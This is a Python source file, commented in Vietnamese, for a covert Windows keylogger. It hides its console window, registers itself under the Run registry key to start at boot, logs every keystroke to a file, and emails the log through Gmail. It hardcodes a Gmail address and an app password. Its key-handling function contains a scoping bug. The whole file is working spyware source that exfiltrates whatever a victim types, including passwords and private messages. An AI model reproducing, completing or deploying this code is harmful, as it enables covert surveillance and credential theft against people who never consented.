import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import time
import ctypes
import os
import winreg
import threading

# Ẩn cửa sổ console (chỉ áp dụng cho Windows)
def hide_console():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Cấu hình email
EMAIL_ADDRESS = "nguyenhoangngoc22062003@gmail.com"  # Địa chỉ email của bạn
EMAIL_PASSWORD = "jvrq ycrj forj gfgd"    # Mật khẩu ứng dụng của bạn
EMAIL_RECIPIENT = "nguyenhoangngoc22062003@gmail.com"  # Địa chỉ email nhận log
LOG_FILE = "keylog.txt"
MAX_LOG_SIZE = 50  # Kích thước tối đa của file log trước khi gửi email (50 bytes)

# Biến lưu trạng thái các phím đặc biệt
special_keys = {'ctrl': False, 'alt': False, 'shift': False}

# Đăng ký keylogger để tự khởi động cùng hệ thống
def add_to_registry():
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value = "MyKeylogger"
    script_path = os.path.abspath(__file__)

    try:
        # Mở khóa registry với quyền ghi
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            # Thêm giá trị vào khóa registry
            winreg.SetValueEx(reg_key, value, 0, winreg.REG_SZ, script_path)
        print("Keylogger added to registry successfully.")
    except Exception as e:
        log_error(f"Failed to add to registry: {e}")

# Hàm ghi lỗi vào file log
def log_error(message):
    with open(LOG_FILE, "a") as log:
        log.write(f"[ERROR] {time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

# Hàm ghi các phím đã nhấn vào file
def on_press(key):
    current_time = time.strftime("%Y-%m-%d %H:%M:%S")
    key_name = ''
    
    try:
        key_name = key.char
    except AttributeError:
        key_name = f'[{key}]'

    if key_name in ['<Key.shift>', '<Key.ctrl_l>', '<Key.ctrl_r>', '<Key.alt_l>', '<Key.alt_r>']:
        key_name = key_name.replace('<Key.', '').replace('>', '')
        special_keys[key_name] = True
    else:
        if special_keys['ctrl']:
            key_name = f'Ctrl+{key_name}'
        if special_keys['alt']:
            key_name = f'Alt+{key_name}'
        if special_keys['shift']:
            key_name = f'Shift+{key_name}'
        special_keys = {'ctrl': False, 'alt': False, 'shift': False}
    
    log_entry = f'{current_time} - {key_name}\n'
    try:
        with open(LOG_FILE, "a") as log:
            log.write(log_entry)
    except Exception as e:
        log_error(f"Failed to write log: {e}")

# Hàm gửi email
def send_email(log_content):
    message = MIMEMultipart()
    message["From"] = EMAIL_ADDRESS
    message["To"] = EMAIL_RECIPIENT
    message["Subject"] = "Keylogger Logs"

    body = MIMEText(log_content, "plain")
    message.attach(body)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_RECIPIENT, message.as_string())
    except Exception as e:
        log_error(f"Failed to send email: {e}")

# Hàm đọc nội dung file log và gửi email khi đạt kích thước tối đa
def monitor_log_file():
    while True:
        time.sleep(10)  # Kiểm tra mỗi 10 giây
        try:
            if os.path.getsize(LOG_FILE) >= MAX_LOG_SIZE:
                with open(LOG_FILE, "r") as file:
                    log_content = file.read()
                if log_content:
                    send_email(log_content)
                    with open(LOG_FILE, "w") as file:
                        file.write("")  # Xóa nội dung sau khi gửi
        except Exception as e:
            log_error(f"Failed to monitor log file: {e}")

# Hàm khởi động listener
def start_keylogger():
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        monitor_log_file()
    except Exception as e:
        log_error(f"Failed to start keylogger: {e}")

if __name__ == "__main__":
    hide_console()  # Ẩn cửa sổ console khi chạy
    add_to_registry()  # Đăng ký để tự khởi động cùng hệ thống
    threading.Thread(target=start_keylogger).start()
